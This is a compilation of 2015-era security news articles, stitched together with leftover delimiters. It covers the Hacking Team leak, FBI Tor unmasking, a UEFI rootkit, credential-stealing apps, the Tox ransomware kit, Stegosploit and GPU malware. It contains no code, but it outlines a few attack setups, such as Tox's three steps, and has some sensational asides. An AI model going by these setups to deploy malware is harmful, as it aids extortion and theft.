However, there was only one Violation of Law in this entire event, and that is – \"the massive cyber attack on the Hacking Team.\" company stated. The recent hack on Hacking Team exposed nearly 500GB of massive internal documents including internal emails, hacking tools, zero-day exploits, surveillance tools, source code for Spyware and a spreadsheet listing every government client with date of purchase and amount paid. Hacking Team Hack and Media Reports: The attack on Hacking Team was really huge in every sense. The team finally shows its disappointment with media on its hacking incident saying, the company that helps government fight crimes is being treated as the culprits, and the criminals who attacked the company are not. \"Had a media company been attacked as Hacking Team has been, the press would be outraged,\" Hacking Team wrote in its press release Wednesday. But, every media including us have mentioned that Hacking Team got hacked, which by default indicates that they were the victim to cyber crime. So far, neither they nor anyone in media knows who has hacked and leaked 500GB of internal data belonging to Hacking Team. So, what do they expect from Media to talk about? The Unknown Hacker, about whom no one knows, or the 500 GB of leaked Hacking Team’s Secrets Hacking Team Spyware: Fighting for Crime or aiding Surveillance? Apart from this, the Hacking Team claimed that the strong spyware and hacking tools developed by the company are actually required by the law enforcement agencies to fight crime and terrorism. We all know that what NSA and other government agencies are doing (espionage/surveillance) with such capabilities, instead of putting every effort to fight crime and terrorism. Recently, a 46-year-old member of South Korea's National Intelligence Service (NIS) apparently committed suicide after it was revealed that the Asian country bought spying tools from the Hacking Team. A Suicide note left by the agent at the scene referenced the Hacking Team controversy, and claimed his intelligence team did not use Hacking Team tools to spy on South Korean citizens' mobile phone or any other online communications. This incident could be part of the same conspiracy, which is yet to be investigated. Some Facts Highlighted by Hacking Team Highlighting the facts about its recent hack attack, the company says the attackers stole and exposed the personal information of its employees and some of its clients. However, the attackers were unable to access the data collected by company's clients using purchased spying software, as such information is only stored on the customer's systems and can’t be accessed by the company itself. The attackers also exposed some of its source code on the Internet, but according to Hacking Team, the essential elements of its source code were not compromised in the attack. The company agreed of selling its equipments to countries, including Ethiopia, Sudan, Russia and South Korea among others, but always sold \"strictly under the law and regulation.\" \"There have been reports that our software contained some sort of \"backdoor\" that permitted Hacking Team insight into the operations of our clients or the ability to disable their software,\" The company says. \"This is not true.\" \"No such backdoors were ever present, and clients have been permitted to examine the source code to reassure themselves of this fact.\" The company also denied its involvement in any program that make use of airborne drones to attack computers and smartphone devices through Wi-Fi networks as it has been reported earlier this week." }

Over a year ago, some security researchers developed a drone called 'Snoopy' that was capable to intercept data from users' Smartphones through spoofed wireless networks. Now, the email conversations posted on WikiLeaks website reveal that both Boeing and Hacking Team want unmanned aerial vehicles (UAVS) called Drones to carry out attacks that inject spyware into target computers or mobile phones via WiFi. After attending the International Defense Exposition and Conference (IDEX) in Abu Dhabi in February 2015, the U.S. drone company Boeing subsidiary Insitu become interested in using surveillance drones to deliver Hacking Team's Remote Control System Galileo for even more surveillance. Among the emails, co-founder Marco Valleri gave a roadmap of projects that Hacking Team have underway, including \"Tactical Network Injector\" (TNI) — a piece of hardware designed to inject malicious code into Wi-Fi networks, making it act as a malicious access point to launch man-in-the-middle (MITM) attacks or exploits. To develop a way to infect computers via drone, Hacking Team employee Andrea Di Pasquale was given a task of developing a \"mini-TNI\": Ruggedized Transportable by a drone (!) Drones used to Spy on Targets In case, if a target makes use of a public Wifi network in a hotel or a coffee shop to connect his/her device to the Internet, the drone could intercept the traffic and inject the malicious code that secretly installs Hacking Team spyware. The mini-TNI request was originated from the US-based Insitu, a subsidiary of Boeing that makes a range of unmanned aircraft systems, including the small ScanEagle surveillance drone and RQ-21A \"Blackjack\". Giuseppe Venneri, an Insitu intern, wrote to Hacking Team's key account manager Emad Shehata this April: \"We see potential in integrating your Wi-Fi hacking capability into an airborne system [drone] and would be interested in starting a conversation with one of your engineers [Hacking Team staff] to go over, in more depth, the payload capabilities including the detailed size, weight, and power specs of your Galileo System.\" The email conversation was still in the early stages as of the Hacking Team's leak, so you do not have to worry about drones. Also, it is not clear as to who the customers for the Hacking team's spying drones would be. Though the NSA is very much fond of spyware and surveillance software, there're chances that NSA or other United States agencies would line up as customers of the Hacking Team's Spying drones. Now, you don't have to be surprised if drones are eventually doing a lot more than just snapping pictures." }

The leaked documents contains more than 1 Million internal emails, including emails from FBI agent who wanted to unmask the identity of a user of Tor, the encrypted anonymizing network widely used by activists to keep their identities safe, but also used to host criminal activities. Unmasking Tor User In September last year, an FBI agent asked Hacking Team if the latest version of its Remote Control System (RCS), also known as Galileo - for which the company is famous for, would be capable to reveal the True IP address of a Tor user. The FBI agent only had the proxy IP address of the target, as according to FBI, the target may be using Tor Browser Bundle (TBB) or some other variant. So, the agent wanted to infect the target's computer by making him download a malicious file. \"We'll need to send him an email with a document or PDF [attachment] to hopefully install the scout [Hacking Team's software],\" the FBI agent wrote in the email. In response to the FBI agent query, A Hacking Team staff member said that once the target's computer is infected, \"if he is using TBB you will get the real IP address of the target. Otherwise, once the scout is installed…you can inspect from the device evidence the list of installed programs.\" FBI Spent $775,000 on Hacking Team's Spying Tools So far, it isn't known whether the agents were succeeded in revealing the IP address of the target Tor user or who the target was, but internal emails clearly indicates that this FBI agent took full advantage of Hacking Team's service to unmask Tor users. \"[The FBI] continue to be interested in new features all the more related to TOR, [virtual private networks] VPN and less click infections,\" the same FBI agent said in other emails. \"In the past their targets were 20 per cent on TOR, now they are 60 per cent on TOR.\" Overall, the FBI has spent nearly $775,000 on Hacking Team's spy tools since 2011, Wired reports, although the internal emails indicate that the Remote Control System (RCS) tools were used as a \"back up\" for some other system the agency is already using. Remote Control System (RCS), or Galileo, is the advanced and sophisticated spyware tool for which the Hacking Team is famous. It came loaded with lots of zero-day exploits and have the ability to monitor the computers of its targets remotely." }

Today, Trend Micro security researchers found that the Hacking Team \"uses a UEFI (Unified Extensible Firmware Interface) BIOS Rootkit to keep their Remote Control System (RCS) agent installed in their targets' systems.\" That clearly means, even if the user reinstalls the Operating System, formats the hard disk, and even buys a new hard disk, the agents are implanted after Microsoft Windows is up and running. According to researchers, Hacking Team’s rootkit malware is only able to target UEFI BIOS systems developed by Insyde and AMI vendors, used by the majority of computer and laptop manufacturers. However, at this time researchers are not sure whether the malware can complete the rootkit installation without physical access to the target machine, as the installation requires BIOS flashing process that can’t be done without rebooting into the machine into UEFI (Unified Extensible Firmware Interface) shell. The BIOS rootkit analysis done by Trend Micro researchers was only made possible due to the Spyware source code leaked online in the Hacking Team data dumps. So far, three Adobe Flash zero-day vulnerabilities and an Android zero-day exploit have been discovered from the Hacking Team leaked files, although this BIOS rootkit spreads more light on the team’s activities. The affected victims are yet unknown. However to keep yourself safe, we recommend you always to keep your BIOS up-to-date and protected by enabling password.

Threat researchers from security firm ESET have discovered a malicious Facebook-Credentials-Stealing Trojan masquerading as an Android game that has been downloaded by more than a Million Android users. Malicious Android Apps downloaded 50,000-1,000,000 times The Android game, dubbed \"Cowboy Adventure,\" and another malicious game, dubbed \"Jump Chess\" – downloaded up to 50,000 times, have since been removed from Google Play Store. However, before taking them off from the app store, the creepy game apps may have compromised an unknown number of victims' Facebook credentials. Both the games were created by the same software developer, Tinker Studio and both were used to gather social media credentials from unsuspecting users. How Cowboy Adventure victimizes Android users? Once installed, Cowboy Adventure produced a fake Facebook login window that prompted users to enter their Facebook usernames along with their passwords. A practice known as OAuth in which a 3rd party asks your Facebook login. However, if users provide their credentials to Cowboy Adventure app, the malicious code within the game app allegedly sent their credentials to the attacker's server. Therefore, If you have downloaded Cowboy Adventure or Jump Chess, you should immediately change not alone your Facebook password, but any service that uses the same combination of username and password as your Facebook account. ESET senior security researcher Robert Lipovsky believes that the app malicious behavior is not just a careless mistake of the game developer, but the developer is actually a criminal minded. Take Away A few basic tips that you should always keep in your mind are: Always download apps from official sources, such as Google Play Store or Apple's App Store. Read reviews from other users before downloading an app (Many users complained about \"Cowboy Adventure\" that the game locked them out of Facebook accounts). Always use two-factor authentication on services that makes it harder for hackers to access your accounts with just your password. Always keep a malware scanning software from trusted vendors like Avast, AVG, ESET, Kaspersky and Bitdefender, on your smartphone." }

Evgeniy Mikhailovich Bogachev | Reward - $3 MILLION Evgeniy Mikhailovich Bogachev, also known under the aliases \"lucky12345,\" \"Slavik,\" and \"Pollingsoon,\" is the mastermind behind the GameOver Zeus botnet, which was allegedly used by criminals to infect more than 1 Million computers, resulting in up to $100 Million in losses since 2009. Besides GameOver Zeus botnet, Bogachev is also accused of developing CryptoLocker Ransomware, which was designed to extort money from computer victims by holding their system’s files hostage until the victim pays a ransom fee to get them back. Bogachev tops the FBI target's list with $3 Million in reward for anyone giving the information leading to his direct arrest and/or conviction. 2. Nicolae Popescu | Reward - $1 Million Nicolae Popescu, who also used the aliases Niculae Popescu, Nae Popescu, Nicolae Petrache, \"Nae\", and \"Stoichitoiu\", second topped the FBI's 5 Most-Wanted Cyber Criminals list. This 34-year-old Romanian is accused of fooling innocent Americans with fake auction posts on several websites, including eBay, Cars.com, and AutoTrader.com, claiming to sell cars that just didn't exist. Popescu and other criminal hackers affiliated with the scheme made more than $3 Million off the auctions, victimizing almost 800 users who handed over money for imaginary cars, Rolex watches, yachts, private airplanes, and other luxury goods. Authorities tracked down and arrested six members of the cyber gang in late 2012, but Popescu and a partner slipped away. 3. Alexsey Belan | Reward - $100,000 Alexsey Belan, a Russian national, is wanted for allegedly stealing consumer data by compromising the cyber security systems of three unnamed major US-based e-commerce sites in Nevada and California between 2012 and 2013. After stealing and exporting user databases with passwords to his server, Belan is accused of allegedly negotiating the sales of the databases. 4. Peteris Sahurovs | Reward - $50,000 Peteris Sahurovs is accused of developing and selling a computer virus through advertisements on news website pages. He allegedly carried out the scheme from February 2010 to September 2010. Under the malicious scheme, the fake ads displayed on the web pages forced users to purchase fraudulent antivirus software. In case, a user refuse to buy the software, the victim’s desktop would be flooded with pop-ups and fake security alerts. Sahurovs, a native of Latvia, made more than $2 Million by selling his \"antivirus\" software. 5. Shailesh Kumar Jain | Reward - $50,000 Shailesh Kumar Jain is the only American citizen on the FBI’s Most Wanted Hackers list. Jain made $100 Million between December 2006 and October 2008, according to the FBI. He used a flood of pop-up ads and email scamming to convince users that their computers were infected with a virus and then selling them the bogus AV software packages for between $30 and $70." }

According to the report on the official website of Europol, authorities have arrested five suspects between June 18 and 19. All the five suspects are the members of an alleged gang that has been accused of infecting tens of thousands of computers worldwide with malware and banking Trojans. The alleged cybercriminal group distributed and used Zeus and SpyEye malware to steal money from several major banks in Europe and outside. The gang constantly modified its malware Trojans to defeat the security protocols of banks and used \"mule networks\" to launder money. \"On the underground digital forums, they actively traded stolen credentials, compromised bank account information and malware,\" Europol said in a statement on Thursday, \"while selling their hacking ‘services’ and looking for new cooperation partners in other cybercriminal activities.\" Each cyber criminal of the alleged group had their own speciality.

After these accusations, a wave of criticism by privacy campaigners and open source developers has led Google to remove the extension from Chromium, the open-source version of the Chrome browser. The extension in question is \"Chrome Hotword,\" which was found to be responsible for offering the browser's famous \"OK, Google\" functionality. 'Ok, Google' is certainly a useful feature that allows users to search for things via their voice when they use Google as their default search engine, but its something that also enables eavesdropping of every single conversation made by a user. Google Silently Listens to your Conversation This issue came to light by Pirate Party founder Rick Falkvinge, who says Google has silently installed black box code into the open-source Chromium browser, meaning it contains pre-compiled code that users cannot see. Exactly what this black box does is still unclear, but Falkvinge claimed that Google is listening to the conversations of Chromium users through this black box of code. The 'black box' code enabled a feature that activates a search function on the browser when you say \"Ok, Google,\" however the code enabled the microphone, as well as permitted to capture audios. \"Your computer has been stealth configured to send what was being said in your room to somebody else, to a private company in another country, without your consent or knowledge,\" says Falkvinge. Google Responded to the Issue Google since defended itself, arguing the ability to use \"Ok Google\" commands and enable the extension is an opt-in feature. \"First and foremost, while we do download the hotword module on startup, we do not activate it unless you opt into hotwording,\" Google wrote on its development forums. \"If you go into 'chrome://settings,' you will see a checkbox 'Enable 'Ok Google' to start a voice search. This should be unchecked by default, and if you do not check it, the hotword module will not be started.\" Google also argued that Chrome is not open source and if any of the open source distributors such as Debian have any issue with it, they should disable the module themselves. However, after receiving complaints about the \"bug\" that automatically installs the Chrome Hotword Shared Module without an opt-out configuration, Debian has fixed the issue by disabling the extension in their distribution of Chromium. Google - We aren't Responsible for other browsers Google doesn't deny installing the black box code into Chromium browser, but the company doesn't consider itself responsible for other web browsers that include the code. \"Our primary focus is getting the code ready for Google Chrome,\" says Google. \"If a third-party (such as Debian) distributes it, it is their responsibility to enforce their own policy.\" The key issue here is the inclusion of black box code into Chromium, which is supposed to be an open-source project that lets everyone audit the code. However, Falkvinge says Chromium \"had abused its position as trusted upstream to insert lines of source code that bypassed this audit-then-build process, and which downloaded and installed a black box of unverifiable executable code directly onto computers, essentially rendering them compromised.\" This issue forced Google to make changes in Chromium 45 by disabling the Chrome Hotword extension, making it easier for third party distributors to disable hotwording." }

Alex Yücel, 25, owned and operated an organization called \"BlackShades\" that sold a sophisticated and notorious form of software, called RAT, to several thousands of hackers and other people in more than 100 countries for prices ranging from $40 to $50. BlackShades malware was designed to capture keystrokes, steal usernames and passwords for victims' email and Web services, FTP clients, instant messaging applications, and lots more. In the worst case, the malicious software even allowed hackers to take remote control of victim's computer and webcam to pilfer photos or videos without the knowledge of the computer owner. Yucel (a.k.a. \"marjinz\") was sentenced to four and three-quarter years in prison by U.S. District Judge Kevin Castel after pleading guilty in February in a New York federal court, according to the U.S. Department of Justice. The accused asked the judge for leniency in imposing sentence and said he regret marketing the sophisticated malware to hackers. \"I deeply regret starting this [BlackShades] whole project, which obviously went out of control,\" he said. However, Castel sentenced him to 57 months behind bars along with a penalty of $200,000, saying that \"the message must go forth that this is a serious crime.\" \"We rely on our computers as an extension of how we live our lives,\" Castel said in a press release. \"This is spreading misery to the lives of thousands [of online people]. That's what this is.\" Yucel has already served approximately 13 months in New York prison and roughly one month in Moldova custody, where he was held after capture. The accused developed the RAT with Michael Hogue, an Arizona US resident who already pleaded guilty for the creation of BlackShades malware and agreed to cooperate with U.S. authorities as part of a plea deal. Hogue is scheduled to be sentenced on July 24 this year. In mid-May last year, the law enforcement authorities in the United States and Europe started large-scale International raids against people suspected of developing, selling and buying the notorious BlackShades RAT. The raids took place in over 100 countries worldwide, and the authorities seized 1,900 command and control (CnC) domains and arrested more than 100 people around the world involved in the illegal activities related to BlackShades malware. BlackShades tool was actually developed by an IT surveillance and security-based company, as a tool for parents to monitor their children's activities and for finding the cheating partners in the relationship. However, as usual the cyber criminals have made it a favorite tool to carry out illicit activities." }

A group of security researchers have uncovered potentially deadly zero-day vulnerabilities in both iOS and OS X operating systems that could put iPhone/iPad or Mac owners at a high risk of cyber attacks. Researchers have created and published a malicious app on the App Store that was able to siphon users’ personal data from the password storing Keychain in Apple's OS X, as well as steal passwords from iCloud, banking and email accounts. Dubbed XARA (cross-app resource access), the malware exploit app was able to bypass the OS X sandboxing mechanisms that are supposedly designed to prevent an app from accessing the credentials, contacts, and other important data related to other apps. The Consequences are Dire! In their paper, titled \"Unauthorized Cross-App Resource Access on MAC OS X and iOS\" [PDF], the researchers claim that once installed, their app can obtain data from applications such as Dropbox, Facebook and Evernote, along with the popular messaging app WeChat, and even siphon passwords from 1Password. \"The consequences are dire,\" researchers wrote in the paper. \"For example, on the latest Mac OS X 10.10.3, our sandboxed app successfully retrieved from the system's keychain the passwords and secret tokens of iCloud, email and all kinds of social networks...bank and Gmail passwords from Google Chrome.\" The Researchers also noted that the hack attack is only possible when the attributes of the victim’s keychain item are predictable. However, most of the services share the same name across Keychain stores. The Keychain issue stems from its inability to verify which app owns a credential in Keychain, and even the OS doesn’t check for any suspicious activity. Bypassed Apple’s App Store Security Checks The malicious app was also able to bypass the Apple’s App store security checks that are designed to ensure one app can not gain access to other apps’ data without permission. However, the more worrisome part regarding the malicious app is that it was approved by Apple for placement in its App Store, which is supposed to be pre-examine by Apple security engineers for potentially malicious apps. Apple did not immediately respond to a request for comment. The zero-day flaws discovered by the Indiana University boffins Xing; Xiaolong Bai; XiaoFeng Wang; and Kai Chen joined Tongxin Li, of Peking University, and Xiaojing Liao, of Georgia Institute of Technology, was reported to Apple last October, but the company requested a 6 month period before making it public. However, according to their paper, the issues persist and millions of Apple users can still be affected by these zero-day flaws. How to Protect your Devices A system-wide update to Apple’s OS X and iOS is the only way to protect yourself fully against these vulnerabilities, the researchers said. However, we are patiently waiting to hear from Apple that how it's planning to resolve this huge issue. To protect yourselves against such vulnerabilities, users of all operating system platforms are advised to limit the apps they install on their devices to those that are needed and explicitly trusted." }

So most Facebook users try to find out a software and fall victim to one that promises to accomplish their desired task. Hackers make use of this weakness and often design malicious programs in order to victimize broad audience. Following I am going to disclose the realities behind one such software designed cleverly to trick Facebook users to make them believe it is genuine. UnfriendAlert, a free application that notifies you whenever someone removes you from the Facebook friend list, has been found collecting its users' Facebook credentials. UnfriendAlert Stealing your Facebook Credentials: Security researchers at Malwarebytes have warned users of the UnfriendAlert app saying that the notorious app asks users to login with their Facebook credentials to activate unfriends monitoring and alert service for your Facebook profile. Facebook has provided API OAuth login system for third party applications, where users don't need to provide their Facebook credentials to them. So you should never submit your Facebook password to any third party service or desktop software in any case. Once you enter your login credentials, UnfriendAlert will send it to the website \"yougotunfriended.com\" owned by attackers. Late last month, UnfriendAlert was also classified as potentially unwanted program (PUP) which often displays unwanted advertisements and deceptively installs other malicious software and free apps when visiting some web pages in your Chrome, Firefox, and Internet Explorer, making you fail to block them. Uninstall UnfriendAlert and Change your Password Now! So users are recommended to uninstall UnfriendAlert App from your computer, and besides removing this, you are also advised to change your Facebook password as soon as possible. You can do this under \"Settings —> Password —> Edit.\" Always do some research before installing any third party application as your one single mistake could compromise your online security and privacy in various ways." }

Yes, the normal looking images could hack your computers — thanks to a technique discovered by security researcher Saumil Shah from India. Dubbed \"Stegosploit,\" the technique lets hackers hide malicious code inside the pixels of an image, hiding a malware exploit in plain sight to infect target victims. Just look at the image and you are HACKED! Shah demonstrated the technique during a talk titled, \"Stegosploit: Hacking With Pictures,\" he gave on Thursday at the Amsterdam hacking conference Hack In The Box. According to Shah, \"a good exploit is one that is delivered in style.\" Keeping this in mind, Shah discovered a way to hide malicious code directly into an image, rather than hiding it in email attachments, PDFs or other types of files that are typically used to deliver and spread malicious exploits. To do so, Shah used Steganography — a technique of hiding messages and contents within a digital graphic image, making the messages impossible to spot with the naked eye. Here's How to Hack digital pictures to send malicious exploits: Until now Steganography is used to communicate secretly with each other by disguising a message in a way that anyone intercepting the communication will not realise it's true purpose. Steganography is also being used by terrorist organisations to communicate securely with each other by sending messages to image and video files, due to which NSA officials are forced to watch Porn and much porn. However in this case, instead of secret messages, the malicious code or exploit is encoded inside the image’s pixels, which is then decoded using an HTML 5 Canvas element that allows for dynamic, scriptable rendering of images. The \"Secret Sauce\" behind Stegosploit — this is what Shah calls it. \"I don’t need to host a blog,\" Shah told Motherboard, \"I don’t need to host a website at all. I don’t even need to register a domain. I can [just] take an image, upload it somewhere and if I just point you toward that image, and you load this image in a browser, it will detonate.\" The malicious code, dubbed IMAJS, is a combination of both image code as well as JavaScript hidden into a JPG or PNG image file. Shah hides the malicious code within the image’s pixels, and unless somebody zoom a lot into it, the image looks just fine from the outside. Video Demonstration: Shah demonstrated to Lorenzo Franceschi of Motherboard exactly how his hack works. He used Franceschi’s profile picture and then prepared a demonstration video using his picture as the scapegoat. In the first video presentation, Shah shows a step by step process on how it is possible to hide malicious code inside an image file using steganography technique. You can watch the video given below: In the second video, Shah shows how his Stegosploit actually works. His exploit works only when the target opens the image file on his or her web browser and clicks on the picture. You are HACKED! Once the image is clicked, the system’s CPU shoots up to 100 percent usage, which indicates the exploit successfully worked. The malicious code IMAJS then sends the target machine’s data back to the attacker, thereby creating a text file on the target computer that says — \"You are hacked!\" Shah also has programmed his malicious image to do more stealthy tasks, like downloading and installing spyware on victim’s machine, as well as stealing sensitive data out of the victim’s computer. The bottom line here is: You should not presume the image files as \"innocent\" anymore, as they can hide malicious code deep inside its pixels that could infect your computers. Therefore, always make sure before you click on one. Shah has been working on the research [PDF] during his spare time for almost five years, but he has not tested his technique on popular image sharing websites like Dropbox or Imgur. He also admitted that his method might not work everywhere." }

Ransomware is a type of computer virus that infects a target computer, encrypts their sensitive documents and files, and locks the out until the victim pays a ransom amount, most often in Bitcoins. Sometimes even the best security experts aren't able to unlock them and end up paying off ransom to crooks in order to get their important files back. Tox — Free Ransomware Kit Now, to spread this creepy threat more easily by even a non-tech user, one dark web hacker has released a ransomware-as-a-service kit, dubbed \"Tox,\" for anyone to download and set up their own ransomware for free. Yes, believe it or not, but Tox is completely free to use. The developers of the online software make money by taking a cut (20%) of any successful ransomware campaigns its users run. Tox, which runs on TOR, requires not much technical skills to use and is designed in such a way that almost anyone can easily deploy ransomware in three simple steps, according to security researchers at McAfee who discovered the kit. How to Setup your Custom Ransomware? It takes only a few seconds to create and set up your custom ransomware. Just create an account on the Tox website, without the need to provide your email address or any other identifying information. Once a user register with the site, follow these three simple steps to creating your own malware: Type a desired ransom amount you want to ask victims for. Provide an additional note in the \"Cause\", presumably the message that will alert victims that they are being held hostage to a piece of malware. Finally, you are prompted to fill out a captcha, and click \"Create\". \"This process creates an executable of about 2MB that is disguised as a .scr file,\" McAfee explains. \"Then the Tox [users] distribute and install as they see fit. The Tox site (runs on the TOR network) will track the installs and profit. To withdraw funds, you need only supply a receiving Bitcoin address.\" Your Ransomware is now Ready to infect People: Your custom ransomware, designed to work on Windows systems, is now ready and available to download and spread. Once downloaded, you can target people by sending your virus in an email attachments, just like in the style of traditional phishing emails. Once a victim accidentally opens up the offending .scr file provided in an email, the payload will encrypt all of the data on their system and only decrypts if a Bitcoin payment is made. If target pays the ransom amount, the Bitcoin is then transferred to the user's Tox account from where Tox takes a 20 percent cut, and the rest can be withdrawn by the user. Ransomware is a growing threat to the evolution of cyber criminals techniques, and many victims, including local police departments, do pay ransom to crooks in an attempt to get their important and personal files back. How to Protect Yourself from Ransomware Threat? Last week, I introduced you a Free Ransomware Decryption and Malware Removal ToolKit that could help you deal with different variants of ransomware malware and unlock encrypted files without paying off a single penny to the cyber crooks. However, there are some necessary steps that should be taken to protect yourself from Ransomware attacks. Remember always to keep regular backups of your important data. Make sure that you run an active anti-virus security suite of tools on your machine. Do not open any email attachments from unknown sources. Finally, browse the Internet safely.

You might want to be very careful before downloading the cheats for the popular Minecraft game from Google Play Store. Nearly 3 Million users have downloaded malicious Minecraft Android applications for their smartphone and tablets from the Google Play store, security researchers warned. The security researchers from IT security firm ESET have uncovered as many as 33 fake \"scareware\" applications that have been uploaded to the Google Play store in the course of the past 9 months, masquerading as Minecraft cheats and tip guides. These malicious applications have been downloaded between 660,000 and 2.8 million times. \"All of the discovered apps were fake in that they did not contain any of the promised functionality and only displayed banners that tried to trick users into believing that their Android system is infected with a dangerous virus,\" ESET researcher Lukas Stefanko wrote in a blog post. Once downloaded, these malicious applications show banners designed to trick victims into believing that a dangerous virus has infected their Android smartphone devices. The pop-up alert message also gives victims an option to remove the virus from their device, thereby activating premium-rate SMS subscription that would cost them around €4.80 (£3.40) per week - around £177 per year. Stefanko says that many users who downloaded the malicious Minecraft app thought it was genuine since they downloaded and installed them from the Google Play Store. Thus, the regular advice of not downloading apps from third-party websites does not apply in this case. These scareware Minecraft apps appear to have been developed by the same developer but feature different names and icons. \"They were uploaded to the [Google] Play store by different developer accounts, but we assume that these were all created by one person,\" Stefanko says Moreover, in an attempt to make the scam appears legitimate, cybercriminals took advantage of the names of reputed mobile anti-virus vendors, like G-Data. The fake Minecraft apps have since been removed from the Google Play store, the researchers revealed, however, you can protect yourself from falling victims to these apps by using a good security software on your smartphone and avoiding apps from unknown sources. This isn't first time when the Google Play Store has been found distributing malicious applications. The Play store has had a long history of malicious and fake apps. However, the search engine giant has been trying to get rid of this issue by making use of the Bouncer bot that helped reduce the number of malicious apps by as much as 40 percent since 2011. Back in March, Google also announced plans to manually review Play Store Android app submissions." }

But what if any one of them get compromised via phishing, malware or any other way? The Hacker would be able to access my Google account and obviously Google Play Store account too, which allows anyone to install any Android application remotely into my phone without my knowledge and confirmation… What if someone compromises large number of Google accounts and trigger mass installation of a spying or malware app remotely with just one click???? Yes, this was exactly what the National Security Agency (NSA) had done under its widely spread Global surveillance program. A new top-secret document obtained from the former NSA contractor Edward Snowden revealed that the NSA and its closest allies planned to hijack Google and Samsung app stores to infect smartphones with spyware. The operation was launched by the Network Tradecraft Advancement Team, including spy agents from each of the countries in the so-called Five Eyes intelligence alliance — the United States, the United Kingdom, Canada, New Zealand and Australia. According to the documents published Wednesday by CBC News in collaboration with The Intercept, the NSA, and the Five Eyes were working on ways to exploit smartphone technology for the purpose of surveillance. PROJECT IRRITANT HORN During the workshops held in Canada and Australia between November 2011 and February 2012, the Tradecraft unit dedicatedly looked for ways to find and hijack data links to servers used by Google and Samsung's mobile app stores. As part of a project codenamed IRRITANT HORN, the team targeted app store servers where smartphone users get directed whenever they download or update any app from Google or Samsung app stores. But why the Five Eyes alliance hijacking servers? Simply, the team wanted to implant spyware on smartphones using man-in-the-middle attacks to infect the smartphones. The man-in-the-middle attack is a technique used by cyber criminals to intercept the communication and steal sensitive data passing through it. In this case, the technique would have let the spy agencies modify the content of data packets transmitting between the targeted smartphones and the app store servers, ultimately inserting spyware on smartphones to take control of a person's device and covertly extract data from it. Moreover, the spy agencies used its powerful Internet spying tool \"XKeyScore\" to identify targets by matching their targets' smartphones to their online activities, such as emails, chats and browsing histories in order to build the profiles of people they were tracking. Exploited UC Browser Privacy Vulnerabilities: Another major revelation from the documents was the spy agencies’ efforts to discover privacy flaws in one of the world's most popular mobile Internet browsers UC Browser — an app used to browse fast Internet across Asia, specifically in China and India with massive user base of half a Billion people. The agencies tapped into UC Browser and exploited the weakness to collect data on suspected terrorists and other national intelligence targets, and in some cases, implant spyware on targeted smartphones. When analyzed the Android version of the UC Browser app, it was found \"major security and privacy issues\" in its English and Chinese editions, putting millions of its users' data at risk, says a human rights and technology research group in Toronto, Citizen Lab. National Security vs. Users’ Privacy \"Of course, the user of this application has no idea that this is going on,\" says Ron Deibert, director of the Citizen Lab. \"They just assume when they open a browser that the browser's doing what it should do. But, in fact, it's leaking all this information.\" The researchers have published their technical report detailing the many ways the UC Browser app has been leaking data, including SIM card numbers, search queries and unique device IDs that can be used to track people. Deibert says the privacy vulnerabilities in the UC Browser not only exposed Millions of its users to surveillance carried out by government agencies, but it could also have been exploited by malicious hackers to harvest users’ personal data for years. The problem is straight — by secretly exploiting privacy and security vulnerabilities in popular software for years, these spy agencies are putting ordinary users at risk. These agencies are also making it easier for criminal hackers by opening loopholes, instead of reporting them to the companies so that they can be fixed on time." }

Nowadays, attackers use highly sophisticated tactics and often go to extraordinary lengths in order to mount an attack. And there is something new to the list: A team of developers has created not one, but two pieces of malware that run on an infected computer’s graphics processor unit (GPU) instead of its central processor unit (CPU), in order to enhance their stealthiness and computational efficiency. The two pieces of malware: Jellyfish Rootkit for Linux operating system Demon Keylogger The source code of both the Jellyfish Rootkit and the Demon keylogger, which are described as proof-of-concepts malware, have been published on Github. Until now, security researchers have discovered nasty malware running on the CPU and exploiting the GPU capabilities in an attempt to mine cryptocurrencies such as Bitcoins. However, these two malware could operate without exploiting or modifying the processes in the operating system kernel, and this is why they do not trigger any suspicion that a system is infected and remain hidden. JELLYFISH ROOTKIT Jellyfish rootkit is a proof-of-concept malware code designed to show that running malware on GPUs is practically possible, as dedicated graphics cards have their processors and memory. These types of rootkits could snoop on the CPU host memory through DMA (direct memory access), which allows hardware components to read the main system memory without going through the CPU, making such actions harder to detect. The pseudo-anonymous developers describe their Jellyfish Rootkit as: \"Jellyfish is a Linux based userland gpu rootkit proof of concept project utilizing the LD_PRELOAD technique from Jynx (CPU), as well as the OpenCL API developed by Khronos group (GPU). Code currently supports AMD and NVIDIA graphics cards. However, the AMDAPPSDK does support Intel as well.\" Advantages of GPU stored memory: No GPU malware analysis tools are available on the Internet Can snoop on CPU host memory via DMA (direct memory access) GPU can be used for fast/swift mathematical calculations like parsing or XORing Stubs Malicious memory is still inside GPU after device shutdown Requirements for use: Have OpenCL drivers/icds installed Nvidia or AMD graphics card (Intel supports AMD's SDK) Change line 103 in rootkit/kit.c to server ip you want to monitor GPU client from Stay tuned for more features: client listener; let buffers stay stored in GPU until you send a magic packet from the server The anonymous developers of the rootkit warned people that Jellyfish is a proof-of-concept malware and still a work in progress so that it can contain flaws. The code published on Github is intended to be used for educational purposes only. DEMON KEYLOGGER Moreover, the developers also built a separate, GPU-based keylogger, dubbed Demon though they did not provide any technical details about the tool. Demon keylogger is also a proof-of-concept that is inspired by the malware described in a 2013 academic research paper [PDF] titled \"You Can Type, but You Can’t Hide: A Stealthy GPU-based Keylogger,\" but the developers stressed that they were not working with the researchers. \"We are not associated with the creators of this paper,\" the Demon developers said. \"We only PoC’d what was described in it, plus a little more.\" As described in the research paper, GPU-based keystroke logger consists of two main components: A CPU-based component that is executed once, during the bootstrap phase, with the task of locating the address of the keyboard buffer in main memory. A GPU-based component that monitors, via DMA, the keyboard buffer, and records all keystroke events. However, users may not worry about cyber criminals or hackers using GPU-based malware yet, but proof-of-concepts malware such as Jellyfish Rootkit and Demon keylogger could inspire future developments. However, if exploited in future, What could be the area of attack vectors? Hit the comments below." }

